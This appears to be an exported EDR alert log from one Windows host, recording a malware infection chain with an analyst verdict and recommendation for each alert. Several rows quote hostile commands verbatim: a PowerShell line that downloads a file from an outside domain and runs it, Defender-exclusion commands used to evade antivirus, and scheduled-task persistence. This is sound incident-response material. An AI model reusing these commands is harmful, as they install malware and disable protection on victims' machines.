Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:23:10.601",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: cmd.exe | C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL' ; Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-C61B50CB
"Jun 1, 2026 @ 14:23:11.974",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BB2B2507
"Jun 1, 2026 @ 14:22:57.532",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"9,916",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-AD387BE2
"Jun 1, 2026 @ 14:22:58.852",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"22,348",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-2DDDC521
"Jun 1, 2026 @ 14:23:04.642",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-04C7009A
"Jun 1, 2026 @ 14:23:13.210",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-B7B39EC2
"Jun 1, 2026 @ 14:23:05.070",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-DB2DFE4D
"Jun 1, 2026 @ 14:23:15.461",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-D80CD8E9
"Jun 1, 2026 @ 14:23:15.481",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"19,284",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-9D807396
"Jun 1, 2026 @ 14:23:15.485",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"26,804",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-CA275B1E
"Jun 1, 2026 @ 14:21:18.247",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\outlook.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\cnfnot32.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\scanost.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\outlook.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-C8A6804A
"Jun 1, 2026 @ 14:24:16.947",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,100,Outbound to external IP: 52.109.0.35 ; Outbound to external IP: 52.108.9.12 ; High distinct destinations for excel.exe,173.10.254.170,52.109.0.35,,,,disconnect_received,"25,556",,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-35FBC677
"Jun 1, 2026 @ 14:23:15.549",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-58C9CB27
"Jun 1, 2026 @ 14:23:16.607",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-9A9685CA
"Jun 1, 2026 @ 14:23:16.629",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"26,804",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BA9524A6
"Jun 1, 2026 @ 14:24:02.219",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js ; svchost.exe launching a script interpreter",,,,,,start,"33,896",T1059.005,Visual Basic,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-C6C7A2B2
"Jun 1, 2026 @ 14:23:14.385",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E7A7DB6A
"Jun 1, 2026 @ 14:23:14.403",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0F8E9D79
"Jun 1, 2026 @ 14:23:14.408",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"19,284",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-1E9EDB7C
"Jun 1, 2026 @ 14:23:14.466",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-628A1ECC
"Jun 1, 2026 @ 14:23:13.317",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-4791C22C
"Jun 1, 2026 @ 14:23:13.334",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-85F7557A
"Jun 1, 2026 @ 14:23:13.336",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-57518A36
"Jun 1, 2026 @ 14:23:13.405",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-58D05900
"Jun 1, 2026 @ 14:23:22.978",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare process pair: office_portable_x3.exe->schtasks.exe ; Living-off-the-land binary: schtasks.exe ; Persistence command: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,,,,,,start,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-04012947
"Jun 1, 2026 @ 14:23:23.205",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare process pair: office_portable_x3.exe->schtasks.exe ; Living-off-the-land binary: schtasks.exe ; Persistence command: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,,,,,,end,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-D1899406
"Jun 1, 2026 @ 14:21:16.773",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\selfcert.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msohtmed.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\setlang.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msqry32.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\selfcert.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-5540BC28
"Jun 1, 2026 @ 14:21:16.774",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoxmled.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\excelcnv.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\wordconv.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoxmled.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4D51C3D0
"Jun 1, 2026 @ 14:23:12.144",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-65B8243B
"Jun 1, 2026 @ 14:23:12.163",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E10068CA
"Jun 1, 2026 @ 14:23:12.166",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-F669406F
"Jun 1, 2026 @ 14:23:12.231",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-3D080498
"Jun 1, 2026 @ 14:23:10.561",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BF3B4EF1
"Jun 1, 2026 @ 14:23:10.672",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0ADA40AD
"Jun 1, 2026 @ 14:23:01.254",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"22,348",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-5581FD2F
"Jun 1, 2026 @ 14:21:44.249",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF195CBE8F36B8CF7D.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-CEC5588F
"Jun 1, 2026 @ 14:21:44.253",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF32DC07AC6C1C7C0E.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-9AE38043
"Jun 1, 2026 @ 14:23:04.838",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-EE9AA75B
"Jun 1, 2026 @ 14:23:04.840",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-69E8DF1E
"Jun 1, 2026 @ 14:23:04.841",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E87EB71B
"Jun 1, 2026 @ 14:23:04.853",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-DB909745
"Jun 1, 2026 @ 14:21:43.241",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF02FE7A77618DC74C.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-2F6978CC
"Jun 1, 2026 @ 14:22:58.483",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""",Download Execute | LOLBin Abuse | PowerShell Payload | Rare Parent-Child | Sigma Match | Suspicious User-Agent / Tool,100,Rare process pair: powershell.exe->powershell.exe ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Download-then-execute pattern detected,,,,,,end,"1,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Isolate host; retrieve and sandbox the downloaded payload,AH-6040AB77
"Jun 1, 2026 @ 14:21:40.989",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFC56D55DB77388291.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-38382216
"Jun 1, 2026 @ 14:21:40.994",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF4A4E0E2313FC8971.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-121FCB8C
"Jun 1, 2026 @ 14:21:42.916",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFD36A845BD7300A43.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-1DD61115
"Jun 1, 2026 @ 14:23:04.854",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-971A881F
"Jun 1, 2026 @ 14:23:04.855",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E91DD816
